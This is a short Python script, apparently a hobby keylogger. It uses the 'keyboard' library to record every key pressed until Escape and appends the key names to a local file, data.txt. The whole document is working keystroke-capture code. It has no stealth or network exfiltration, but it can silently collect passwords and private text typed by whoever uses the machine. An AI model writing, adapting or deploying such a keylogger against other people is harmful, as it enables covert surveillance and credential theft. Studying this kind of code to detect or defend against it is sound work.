import keyboard


def main():
    keys_pressed = keyboard.record(until='escape')
    file = open("data.txt", 'a')
    # print(keys_pressed)
    for event in keys_pressed:
        if event.event_type == 'down':
            if event.name == 'space':
                file.write(" ")
            elif event.name == 'right shift' or event.name == 'left shift' or event.name == 'shift' or event.name == 'esc':
                continue
            else:
                file.write(event.name)


if __name__ == "__main__":
    main()
